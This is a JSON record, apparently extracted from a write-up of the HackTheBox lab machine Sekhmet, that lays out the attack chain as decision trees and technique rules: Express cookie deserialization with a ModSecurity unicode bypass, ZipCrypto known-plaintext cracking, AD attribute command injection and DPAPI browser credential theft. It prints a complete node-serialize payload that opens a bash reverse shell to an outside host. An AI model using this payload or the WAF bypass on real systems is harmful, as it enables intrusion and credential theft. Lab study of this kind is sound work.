{
  "writeup_id": "Htb_Sekhmet",
  "scenario_fingerprint": {
    "scenario_name": "hybrid_windows_linux_kerberos_exploitation",
    "primary_services": [
      "http",
      "ssh",
      "kerberos",
      "smb"
    ],
    "port_signature": "22+80+88+445",
    "service_combination": "ssh+http+kerberos+smb",
    "os_family": "hybrid_windows_linux",
    "environment_type": "active_directory_with_linux_vm",
    "entry_vector": "json_deserialization_waf_bypass",
    "privilege_path": "webapp_to_vm_to_domain_admin",
    "attack_complexity": "insane",
    "estimated_time": "8-12 hours",
    "scenario_confidence": 0.92,
    "distinguishing_factors": [
      "expressjs_json_deserialization",
      "modsecurity_waf_bypass",
      "zipcrypto_known_plaintext_attack",
      "dpapi_credential_extraction",
      "command_injection_in_ad_script"
    ],
    "environmental_clues": [
      "linux_vm_in_windows_domain",
      "backup_archives_with_encryption",
      "mobile_attribute_monitoring_script",
      "edge_browser_credential_storage",
      "mixed_os_infrastructure"
    ],
    "similar_scenarios": [
      "hathor_htb_insane",
      "anubis_htb_medium"
    ],
    "unique_aspects": [
      "multi_stage_crypto_attacks",
      "hybrid_linux_windows_pivot",
      "ad_mobile_attribute_exploitation",
      "dpapi_edge_credential_theft"
    ]
  },
  "success_patterns": {
    "success_factors": [
      {
        "technique": "JSON_Deserialization_Attack",
        "success_reason": "ExpressJS application vulnerable to unsafe deserialization of user-controlled cookie data",
        "prerequisite_indicators": [
          "express_framework_detected",
          "base64_encoded_cookie_present",
          "json_data_in_cookie",
          "no_signature_validation"
        ],
        "recognition_patterns": [
          "X-Powered-By: Express header",
          "base64 cookie decodes to JSON",
          "cookie contains serialized object data",
          "application accepts modified cookie values"
        ],
        "failure_modes": [
          "cookie_signature_validation",
          "input_sanitization_present",
          "waf_blocking_payloads",
          "secure_deserialization_library"
        ],
        "environmental_factors": [
          "nodejs_express_application",
          "unsafe_cookie_handling",
          "lack_of_input_validation",
          "modsecurity_waf_bypass_required"
        ],
        "success_probability": 0.75,
        "typical_timeframe": "15-30 minutes"
      },
      {
        "technique": "Known_Plaintext_ZipCrypto_Attack",
        "success_reason": "Encrypted ZIP archive contained predictable file that enabled key recovery",
        "prerequisite_indicators": [
          "encrypted_zip_file_present",
          "zipcrypto_encryption_used",
          "known_file_contents_available",
          "traditional_pkzip_encryption"
        ],
        "recognition_patterns": [
          "ZIP file requires password",
          "file listing shows predictable files",
          "encryption method is ZipCrypto/Traditional",
          "backup archives with standard files"
        ],
        "failure_modes": [
          "aes_encryption_used",
          "no_known_plaintext_available",
          "insufficient_known_data",
          "modern_encryption_methods"
        ],
        "environmental_factors": [
          "legacy_zip_encryption",
          "backup_files_with_predictable_content",
          "insufficient_crypto_implementation"
        ],
        "success_probability": 0.85,
        "typical_timeframe": "10-20 minutes"
      },
      {
        "technique": "Command_Injection_via_LDAP_Attribute",
        "success_reason": "Script processing mobile attribute from AD without input sanitization",
        "prerequisite_indicators": [
          "automated_script_processing_ad_data",
          "ldap_attribute_modification_possible",
          "command_execution_context_available",
          "insufficient_input_validation"
        ],
        "recognition_patterns": [
          "text file updates based on AD attributes",
          "script execution with domain privileges",
          "ldap queries processing user attributes",
          "command injection metacharacters accepted"
        ],
        "failure_modes": [
          "input_sanitization_present",
          "restricted_execution_context",
          "attribute_modification_blocked",
          "command_filtering_active"
        ],
        "environmental_factors": [
          "active_directory_integration",
          "automated_data_processing",
          "privileged_script_execution",
          "insufficient_security_controls"
        ],
        "success_probability": 0.7,
        "typical_timeframe": "20-40 minutes"
      },
      {
        "technique": "DPAPI_Credential_Extraction",
        "success_reason": "User context allowed decryption of Edge browser stored credentials",
        "prerequisite_indicators": [
          "user_profile_access_available",
          "edge_browser_installed",
          "saved_credentials_present",
          "dpapi_keys_accessible"
        ],
        "recognition_patterns": [
          "Edge user data directory accessible",
          "Login Data SQLite database present",
          "encrypted credential blobs found",
          "user context for DPAPI decryption"
        ],
        "failure_modes": [
          "no_saved_credentials",
          "dpapi_keys_inaccessible",
          "additional_authentication_required",
          "credential_database_encrypted"
        ],
        "environmental_factors": [
          "windows_user_environment",
          "browser_credential_storage",
          "dpapi_protection_mechanism",
          "user_session_context"
        ],
        "success_probability": 0.8,
        "typical_timeframe": "10-15 minutes"
      }
    ],
    "critical_discoveries": [
      {
        "discovery": "admin/admin default credentials",
        "discovery_method": "credential_guessing",
        "why_critical": "Provided initial access to vulnerable ExpressJS application",
        "how_to_recognize": [
          "simple login form present",
          "default credential patterns",
          "no account lockout mechanisms"
        ],
        "follow_up_actions": [
          "analyze_session_cookies",
          "test_deserialization_attacks",
          "enumerate_application_functionality"
        ]
      },
      {
        "discovery": "Base64 JSON cookie without signature",
        "discovery_method": "cookie_analysis",
        "why_critical": "Enabled deserialization attack vector for code execution",
        "how_to_recognize": [
          "base64 encoded cookie values",
          "json structure in decoded data",
          "no signature or integrity protection"
        ],
        "follow_up_actions": [
          "craft_deserialization_payload",
          "test_code_execution",
          "bypass_waf_protections"
        ]
      },
      {
        "discovery": "Encrypted backup archive with predictable content",
        "discovery_method": "file_system_enumeration",
        "why_critical": "Known plaintext attack revealed domain user credentials",
        "how_to_recognize": [
          "password protected zip files",
          "backup file naming patterns",
          "zipcrypto encryption method"
        ],
        "follow_up_actions": [
          "identify_known_plaintext",
          "execute_zipcrypto_attack",
          "extract_credential_hashes"
        ]
      }
    ],
    "escalation_keys": [
      {
        "privilege_level": "web_application_user",
        "escalation_method": "deserialization_to_system_execution",
        "why_possible": "Unsafe cookie deserialization allowed arbitrary code execution",
        "recognition_signs": [
          "express_application_with_cookies",
          "json_serialized_session_data",
          "no_input_validation"
        ],
        "exploitation_path": "Cookie Manipulation → Deserialization → Code Execution"
      },
      {
        "privilege_level": "domain_user",
        "escalation_method": "command_injection_via_ldap",
        "why_possible": "Script processed AD attributes without sanitization",
        "recognition_signs": [
          "automated_ad_data_processing",
          "ldap_attribute_modification_rights",
          "script_execution_with_privileges"
        ],
        "exploitation_path": "LDAP Attribute Injection → Command Execution → Credential Harvest"
      },
      {
        "privilege_level": "local_user",
        "escalation_method": "dpapi_credential_extraction",
        "why_possible": "User context provided access to decrypt stored browser credentials",
        "recognition_signs": [
          "user_profile_directory_access",
          "browser_credential_storage",
          "dpapi_decryption_capability"
        ],
        "exploitation_path": "User Access → DPAPI Decryption → Domain Admin Credentials"
      }
    ]
  },
  "decision_tree": {
    "decision_points": [
      {
        "step": 1,
        "situation": "Found ports 22,80 open on Linux host with Windows domain references",
        "decision": "Enumerate subdomains and identify web application stack",
        "reasoning": "Limited attack surface suggests web exploitation path, domain references indicate AD environment",
        "confidence": 0.9,
        "alternatives": [
          {
            "option": "ssh_enumeration",
            "when": "if web exploitation fails"
          },
          {
            "option": "service_version_exploits",
            "when": "if known CVEs exist"
          }
        ],
        "success_indicators": [
          "subdomains_discovered",
          "web_application_identified",
          "tech_stack_fingerprinted"
        ],
        "next_decision": "analyze_web_application_vulnerabilities"
      },
      {
        "step": 2,
        "situation": "Found ExpressJS application with cookie-based authentication",
        "decision": "Test for deserialization vulnerabilities in cookie handling",
        "reasoning": "Express applications commonly vulnerable to JSON deserialization, cookie contains JSON data",
        "confidence": 0.85,
        "prerequisites": [
          "express_application_confirmed",
          "json_cookie_identified"
        ],
        "success_indicators": [
          "deserialization_payload_accepted"
        ],
        "failure_fallbacks": [
          "directory_traversal",
          "sql_injection",
          "xss_attacks"
        ]
      },
      {
        "step": 3,
        "situation": "Deserialization blocked by ModSecurity WAF",
        "decision": "Implement WAF bypass using unicode encoding",
        "reasoning": "WAFs often miss unicode-encoded payloads while application still processes them",
        "confidence": 0.75,
        "alternatives": [
          {
            "option": "double_encoding",
            "when": "if unicode fails"
          },
          {
            "option": "case_variation",
            "when": "if simple bypasses work"
          },
          {
            "option": "payload_fragmentation",
            "when": "if length-based filtering"
          }
        ],
        "success_indicators": [
          "waf_bypass_successful",
          "code_execution_achieved"
        ],
        "next_decision": "establish_persistent_access"
      },
      {
        "step": 4,
        "situation": "Code execution on Linux VM in domain environment",
        "decision": "Search for domain credentials and privilege escalation vectors",
        "reasoning": "VM likely has domain connectivity, need to pivot to Windows infrastructure",
        "confidence": 0.9,
        "prerequisites": [
          "shell_access_established"
        ],
        "success_indicators": [
          "domain_credentials_found",
          "backup_files_discovered"
        ],
        "failure_fallbacks": [
          "local_privilege_escalation",
          "network_enumeration"
        ]
      },
      {
        "step": 5,
        "situation": "Found encrypted backup archive with domain user hash",
        "decision": "Attempt known plaintext attack on ZipCrypto encryption",
        "reasoning": "ZipCrypto vulnerable to known plaintext attacks when file contents predictable",
        "confidence": 0.8,
        "alternatives": [
          {
            "option": "dictionary_attack",
            "when": "if known plaintext unavailable"
          },
          {
            "option": "brute_force",
            "when": "if weak password suspected"
          }
        ],
        "success_indicators": [
          "archive_decrypted",
          "domain_hash_extracted"
        ],
        "next_decision": "crack_domain_credentials"
      },
      {
        "step": 6,
        "situation": "Obtained domain user credentials",
        "decision": "Enumerate domain shares and identify attack vectors",
        "reasoning": "Domain users typically have access to shares containing sensitive information",
        "confidence": 0.85,
        "prerequisites": [
          "domain_credentials_valid"
        ],
        "success_indicators": [
          "accessible_shares_found",
          "sensitive_files_discovered"
        ],
        "failure_fallbacks": [
          "bloodhound_enumeration",
          "kerberoasting"
        ]
      },
      {
        "step": 7,
        "situation": "Found command injection in domain script processing user attributes",
        "decision": "Exploit injection to capture service account credentials",
        "reasoning": "Scripts processing AD attributes often run with elevated privileges",
        "confidence": 0.9,
        "alternatives": [
          {
            "option": "direct_shell",
            "when": "if outbound connections allowed"
          },
          {
            "option": "file_exfiltration",
            "when": "if execution confirmed"
          }
        ],
        "success_indicators": [
          "service_account_hash_captured"
        ],
        "next_decision": "password_spray_discovered_credentials"
      },
      {
        "step": 8,
        "situation": "Service account password discovered through spraying",
        "decision": "Access host and search for DPAPI protected credentials",
        "reasoning": "Service accounts often have access to systems with cached browser credentials",
        "confidence": 0.75,
        "prerequisites": [
          "host_access_established"
        ],
        "success_indicators": [
          "dpapi_credentials_found",
          "browser_data_accessible"
        ],
        "failure_fallbacks": [
          "registry_enumeration",
          "scheduled_tasks"
        ]
      }
    ],
    "branching_logic": {
      "if_web_exploitation_succeeds": {
        "action": "establish_shell_and_enumerate_domain",
        "tools": [
          "reverse_shell",
          "domain_enumeration"
        ],
        "next_phase": "domain_credential_hunting"
      },
      "if_waf_blocks_payload": {
        "action": "implement_encoding_bypass",
        "alternatives": [
          "unicode_encoding",
          "double_encoding",
          "case_variation"
        ],
        "decision_criteria": "based_on_waf_response_patterns"
      },
      "if_domain_credentials_found": {
        "action": "pivot_to_windows_infrastructure",
        "purpose": "escalate_to_domain_admin",
        "tools": [
          "smbclient",
          "evil-winrm",
          "bloodhound"
        ]
      },
      "if_encrypted_archive_found": {
        "action": "attempt_cryptographic_attacks",
        "methods": [
          "known_plaintext",
          "dictionary",
          "brute_force"
        ],
        "decision_criteria": "based_on_encryption_type_and_file_contents"
      },
      "if_command_injection_found": {
        "action": "capture_service_credentials",
        "purpose": "lateral_movement_to_domain_systems",
        "tools": [
          "responder",
          "ntlmrelayx"
        ]
      }
    },
    "optimization_rules": [
      {
        "rule": "always_test_deserialization_on_express_apps",
        "reasoning": "high_success_rate_for_rce_in_nodejs_applications",
        "applicability": "express_applications_with_json_cookies"
      },
      {
        "rule": "try_unicode_encoding_for_waf_bypass",
        "reasoning": "common_bypass_technique_for_signature_based_wafs",
        "applicability": "when_payloads_blocked_by_waf"
      },
      {
        "rule": "search_for_backup_archives_in_vm_environments",
        "reasoning": "vms_often_contain_backup_data_with_credentials",
        "applicability": "linux_vms_in_windows_domains"
      },
      {
        "rule": "exploit_zipcrypto_with_known_plaintext",
        "reasoning": "zipcrypto_fundamentally_vulnerable_to_known_plaintext",
        "applicability": "encrypted_zip_files_with_predictable_contents"
      },
      {
        "rule": "check_browser_dpapi_credentials_on_user_systems",
        "reasoning": "browsers_store_credentials_that_may_include_domain_admin",
        "applicability": "user_system_access_in_domain_environment"
      }
    ]
  },
  "applicability_rules": {
    "technique_rules": [
      {
        "technique": "JSON Deserialization Attack",
        "mitre_id": "T1203",
        "required_services": [
          "http",
          "https"
        ],
        "required_ports": [
          80,
          443,
          8080,
          8443
        ],
        "os_requirements": [
          "linux",
          "windows"
        ],
        "environmental_prerequisites": [
          "expressjs_application",
          "json_input_accepted",
          "deserialization_vulnerable_library"
        ],
        "success_indicators": [
          "nodejs_error_messages",
          "express_framework_detected",
          "json_content_type_accepted"
        ],
        "incompatible_with": [
          "input_validation_strict",
          "deserialization_disabled",
          "waf_blocking_payloads"
        ],
        "confidence_boosters": [
          "express_server_header",
          "nodejs_stack_traces",
          "package_json_exposed"
        ],
        "typical_success_rate": 0.75,
        "estimated_time": "15-30 minutes"
      },
      {
        "technique": "ModSecurity WAF Bypass",
        "mitre_id": "T1562.001",
        "required_services": [
          "http",
          "https"
        ],
        "required_ports": [
          80,
          443
        ],
        "os_requirements": [
          "linux",
          "windows"
        ],
        "environmental_prerequisites": [
          "modsecurity_waf_present",
          "web_application_behind_waf",
          "payload_encoding_possible"
        ],
        "success_indicators": [
          "modsecurity_error_messages",
          "blocked_request_responses",
          "waf_signature_detection"
        ],
        "incompatible_with": [
          "strict_waf_rules",
          "custom_waf_signatures",
          "request_size_limits"
        ],
        "confidence_boosters": [
          "modsecurity_headers",
          "apache_nginx_with_modsec",
          "default_waf_configuration"
        ],
        "typical_success_rate": 0.65,
        "estimated_time": "20-45 minutes"
      },
      {
        "technique": "ZipCrypto Known Plaintext Attack",
        "mitre_id": "T1560.001",
        "required_services": [
          "file_access"
        ],
        "required_ports": [],
        "os_requirements": [
          "linux",
          "windows"
        ],
        "environmental_prerequisites": [
          "encrypted_zip_file_present",
          "zipcrypto_encryption_used",
          "known_plaintext_available"
        ],
        "success_indicators": [
          "zip_file_with_password",
          "zipcrypto_signature_detected",
          "partial_file_content_known"
        ],
        "incompatible_with": [
          "aes_encryption_used",
          "no_known_plaintext",
          "modern_zip_encryption"
        ],
        "confidence_boosters": [
          "old_zip_format",
          "backup_archives_present",
          "predictable_file_contents"
        ],
        "typical_success_rate": 0.85,
        "estimated_time": "10-20 minutes"
      },
      {
        "technique": "Command Injection",
        "mitre_id": "T1059",
        "required_services": [
          "application_service"
        ],
        "required_ports": [
          80,
          443,
          22,
          445
        ],
        "os_requirements": [
          "linux",
          "windows"
        ],
        "environmental_prerequisites": [
          "user_input_processed",
          "system_commands_executed",
          "insufficient_input_sanitization"
        ],
        "success_indicators": [
          "command_execution_context",
          "system_call_functions",
          "shell_metacharacters_accepted"
        ],
        "incompatible_with": [
          "strict_input_validation",
          "command_execution_disabled",
          "sandboxed_environment"
        ],
        "confidence_boosters": [
          "script_file_processing",
          "automated_tasks_present",
          "user_attribute_processing"
        ],
        "typical_success_rate": 0.8,
        "estimated_time": "10-25 minutes"
      },
      {
        "technique": "DPAPI Credential Extraction",
        "mitre_id": "T1555.004",
        "required_services": [
          "windows_service"
        ],
        "required_ports": [
          445,
          3389
        ],
        "os_requirements": [
          "windows"
        ],
        "environmental_prerequisites": [
          "windows_host_access",
          "user_profile_accessible",
          "dpapi_protected_data_present"
        ],
        "success_indicators": [
          "edge_browser_data",
          "chrome_browser_data",
          "dpapi_masterkey_accessible"
        ],
        "incompatible_with": [
          "masterkey_unavailable",
          "encrypted_profile",
          "browser_data_cleared"
        ],
        "confidence_boosters": [
          "browser_installed",
          "saved_passwords_enabled",
          "user_session_active"
        ],
        "typical_success_rate": 0.9,
        "estimated_time": "5-15 minutes"
      },
      {
        "technique": "Password Spraying",
        "mitre_id": "T1110.003",
        "required_services": [
          "authentication_service"
        ],
        "required_ports": [
          445,
          389,
          88,
          3389,
          22
        ],
        "os_requirements": [
          "windows",
          "linux"
        ],
        "environmental_prerequisites": [
          "user_accounts_enumerated",
          "authentication_service_accessible",
          "account_lockout_policy_weak"
        ],
        "success_indicators": [
          "valid_usernames_identified",
          "authentication_attempts_allowed",
          "common_passwords_effective"
        ],
        "incompatible_with": [
          "strict_lockout_policy",
          "mfa_required",
          "ip_blocking_enabled"
        ],
        "confidence_boosters": [
          "domain_environment",
          "default_passwords_used",
          "password_reuse_patterns"
        ],
        "typical_success_rate": 0.7,
        "estimated_time": "15-30 minutes"
      }
    ],
    "environmental_detectors": {
      "expressjs_application": {
        "port_indicators": [
          80,
          443,
          3000,
          8080
        ],
        "service_indicators": [
          "http",
          "https",
          "nodejs"
        ],
        "banner_indicators": [
          "Express",
          "Node.js",
          "X-Powered-By: Express"
        ],
        "confidence_threshold": 0.8
      },
      "modsecurity_waf": {
        "port_indicators": [
          80,
          443
        ],
        "service_indicators": [
          "http",
          "https",
          "apache",
          "nginx"
        ],
        "banner_indicators": [
          "ModSecurity",
          "mod_security",
          "WAF"
        ],
        "confidence_threshold": 0.75
      },
      "windows_domain": {
        "port_indicators": [
          88,
          389,
          445,
          3268,
          53
        ],
        "service_indicators": [
          "kerberos",
          "ldap",
          "smb",
          "dns"
        ],
        "banner_indicators": [
          "Active Directory",
          "Windows Server",
          "Kerberos"
        ],
        "confidence_threshold": 0.85
      },
      "linux_vm": {
        "port_indicators": [
          22,
          80,
          443
        ],
        "service_indicators": [
          "ssh",
          "http",
          "https"
        ],
        "banner_indicators": [
          "OpenSSH",
          "Debian",
          "Ubuntu",
          "nginx"
        ],
        "confidence_threshold": 0.9
      }
    },
    "attack_prioritization": {
      "high_priority": [
        {
          "attack": "json_deserialization",
          "when": "expressjs_detected",
          "reason": "high_impact_rce_potential"
        },
        {
          "attack": "dpapi_extraction",
          "when": "windows_host_access_gained",
          "reason": "often_contains_domain_credentials"
        },
        {
          "attack": "zipcrypto_attack",
          "when": "encrypted_backup_found",
          "reason": "high_success_rate_credential_recovery"
        }
      ],
      "medium_priority": [
        {
          "attack": "command_injection",
          "when": "script_processing_detected",
          "reason": "reliable_but_requires_specific_context"
        },
        {
          "attack": "password_spraying",
          "when": "domain_environment_confirmed",
          "reason": "effective_with_discovered_passwords"
        }
      ]
    }
  },
  "technique_intelligence": {
    "techniques": [
      {
        "name": "JSON Deserialization Attack",
        "mitre_id": "T1203",
        "category": "execution",
        "phase": "initial_access",
        "tools_used": [
          {
            "name": "manual_exploitation",
            "command_template": "{\"rce\":\"_$$ND_FUNC\\u0024$_function() \\u007brequire('child_process').exec('{command}', function(error,stdout,stderr) {console.log(stdout) });\\n}()\"}",
            "actual_command": "{\"rce\":\"_$$ND_FUNC\\u0024$_function() \\u007brequire('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/10.10.14.6/443 0>&1\\\"', function(error,stdout,stderr) {console.log(stdout) });\\n}()\"}",
            "output_pattern": "reverse_shell_connection",
            "effectiveness_rating": 5,
            "reliability": 0.9
          }
        ],
        "prerequisites": [
          "nodejs_express_application",
          "cookie_based_session_management",
          "deserialization_vulnerability"
        ],
        "success_indicators": [
          "500_error_on_malformed_payload",
          "200_response_on_valid_payload",
          "command_execution_confirmed",
          "reverse_shell_established"
        ],
        "common_failures": [
          "waf_blocking_payload",
          "incorrect_unicode_encoding",
          "malformed_json_structure"
        ],
        "follow_up_techniques": [
          "privilege_escalation",
          "lateral_movement",
          "credential_harvesting"
        ],
        "time_investment": "30-60 minutes",
        "skill_level": "intermediate"
      },
      {
        "name": "WAF Bypass via Unicode Encoding",
        "mitre_id": "T1027",
        "category": "defense_evasion",
        "phase": "initial_access",
        "tools_used": [
          {
            "name": "unicode_encoding",
            "command_template": "Replace blocked characters: $ -> \\u0024, { -> \\u007b",
            "actual_command": "_$$ND_FUNC\\u0024$_function() \\u007b",
            "output_pattern": "500_error_instead_of_403_forbidden",
            "effectiveness_rating": 4,
            "reliability": 0.85
          }
        ],
        "prerequisites": [
          "modsecurity_waf_present",
          "unicode_decoding_not_implemented",
          "blocked_payload_identified"
        ],
        "success_indicators": [
          "403_forbidden_bypassed",
          "payload_reaches_application",
          "unicode_characters_properly_decoded"
        ],
        "common_failures": [
          "waf_includes_unicode_decoding",
          "application_doesnt_decode_unicode",
          "incomplete_character_encoding"
        ],
        "follow_up_techniques": [
          "payload_execution",
          "command_injection",
          "reverse_shell_establishment"
        ],
        "time_investment": "15-45 minutes",
        "skill_level": "intermediate"
      },
      {
        "name": "Subdomain Enumeration",
        "mitre_id": "T1590.002",
        "category": "reconnaissance",
        "phase": "reconnaissance",
        "tools_used": [
          {
            "name": "ffuf",
            "command_template": "ffuf -u http://{target_ip} -H \"Host: FUZZ.{domain}\" -w {wordlist} -ac -mc all",
            "actual_command": "ffuf -u http://10.10.11.179 -H \"Host: FUZZ.windcorp.htb\" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac -mc all",
            "output_pattern": "[Status: 403, Size: 2436, Words: 234, Lines: 44, Duration: 110ms] * FUZZ: portal",
            "effectiveness_rating": 5,
            "reliability": 0.95
          }
        ],
        "prerequisites": [
          "domain_name_identified",
          "virtual_host_routing_suspected",
          "target_responds_to_http"
        ],
        "success_indicators": [
          "additional_subdomains_discovered",
          "different_response_codes_found",
          "new_attack_surface_identified"
        ],
        "common_failures": [
          "no_virtual_hosts_configured",
          "rate_limiting_blocks_requests",
          "all_subdomains_return_same_response"
        ],
        "follow_up_techniques": [
          "web_application_testing",
          "directory_enumeration",
          "technology_stack_identification"
        ],
        "time_investment": "5-15 minutes",
        "skill_level": "beginner"
      }
    ],
    "tool_effectiveness": [
      {
        "tool": "ffuf",
        "use_case": "subdomain_enumeration",
        "effectiveness_rating": 5,
        "reliability": 0.95,
        "learning_curve": "low",
        "essential_for": [
          "web_application_testing"
        ],
        "alternatives": [
          "gobuster",
          "wfuzz",
          "dirbuster"
        ],
        "best_practices": [
          "use_auto_calibration_flag",
          "include_all_response_codes",
          "use_comprehensive_wordlists"
        ]
      },
      {
        "tool": "nmap",
        "use_case": "port_scanning_and_service_detection",
        "effectiveness_rating": 5,
        "reliability": 0.98,
        "learning_curve": "low",
        "essential_for": [
          "network_reconnaissance"
        ],
        "alternatives": [
          "masscan",
          "rustscan",
          "zmap"
        ],
        "best_practices": [
          "start_with_fast_port_scan",
          "follow_up_with_service_detection",
          "use_appropriate_timing_templates"
        ]
      }
    ],
    "command_sequences": [
      {
        "sequence_name": "nodejs_deserialization_to_shell",
        "steps": [
          {
            "step": 1,
            "command": "ffuf -u http://10.10.11.179 -H \"Host: FUZZ.windcorp.htb\" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac -mc all",
            "purpose": "Discover subdomains",
            "expected_output": "portal.windcorp.htb found"
          },
          {
            "step": 2,
            "command": "Login with admin:admin credentials",
            "purpose": "Access application functionality",
            "expected_output": "Session cookie with JSON data"
          },
          {
            "step": 3,
            "command": "Test WAF with malicious payload",
            "purpose": "Identify blocking patterns",
            "expected_output": "403 Forbidden responses"
          },
          {
            "step": 4,
            "command": "Encode payload with unicode: {\"rce\":\"_$$ND_FUNC\\u0024$_function() \\u007brequire('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/10.10.14.6/443 0>&1\\\"', function(error,stdout,stderr) {console.log(stdout) });\\n}()\"}",
            "purpose": "Bypass WAF and execute reverse shell",
            "expected_output": "Reverse shell connection as webster"
          }
        ],
        "success_rate": 0.8,
        "typical_duration": "45-90 minutes"
      }
    ]
  },
  "metadata": {
    "basic_metadata": {
      "name": "Sekhmet",
      "difficulty": "Insane",
      "os": "Windows/Linux",
      "platform": "HackTheBox",
      "release_date": "2022-09-10",
      "author": "4ndr34z",
      "estimated_time": "4-8 hours"
    },
    "intelligence_metadata": {
      "attack_complexity": "high",
      "skill_level_required": "advanced",
      "primary_attack_vectors": [
        "json_deserialization",
        "kerberos",
        "waf_bypass",
        "cryptographic_attacks"
      ],
      "key_vulnerabilities": [
        "expressjs_deserialization",
        "zipcrypto_weakness",
        "command_injection",
        "dpapi_credential_exposure"
      ],
      "environment_type": "hybrid_windows_linux_domain",
      "real_world_relevance": "very_high",
      "learning_value": [
        "waf_evasion",
        "known_plaintext_attacks",
        "dpapi_exploitation",
        "cross_platform_pivoting"
      ],
      "prerequisite_knowledge": [
        "advanced_web_exploitation",
        "cryptography",
        "active_directory",
        "linux_privilege_escalation"
      ]
    },
    "categorization": {
      "primary_category": "multi_platform_exploitation",
      "subcategories": [
        "web_application_security",
        "cryptographic_attacks",
        "active_directory",
        "credential_harvesting"
      ],
      "attack_types": [
        "deserialization",
        "waf_bypass",
        "privilege_escalation",
        "credential_access",
        "lateral_movement"
      ],
      "defensive_lessons": [
        "waf_configuration",
        "secure_deserialization",
        "dpapi_protection",
        "cross_platform_monitoring"
      ]
    },
    "similarity_markers": {
      "similar_boxes": [
        "Blackfield",
        "APT",
        "Multimaster"
      ],
      "similarity_reasons": [
        "complex_attack_chains",
        "kerberos_exploitation",
        "credential_harvesting",
        "multi_stage_escalation"
      ],
      "unique_aspects": [
        "hybrid_linux_windows",
        "zipcrypto_attack",
        "modsecurity_bypass",
        "dpapi_edge_creds"
      ],
      "difficulty_factors": [
        "multiple_exploitation_phases",
        "cryptographic_knowledge_required",
        "waf_evasion_skills",
        "cross_platform_understanding"
      ]
    }
  },
  "extraction_metadata": {
    "parse_date": "2025-07-04T17:42:48.951445",
    "original_file": "0xdf_writeups/Htb Sekhmet.md",
    "content_length": 93422,
    "extraction_version": "2.0-claude",
    "model_used": "claude-sonnet-4-20250514"
  },
  "intelligence_confidence": 1.0,
  "quality_breakdown": {
    "scenario_uniqueness": 1.0,
    "success_logic_clarity": 1.0,
    "applicability_completeness": 1.0,
    "decision_tree_depth": 1.0,
    "technique_actionability": 1.0
  }
}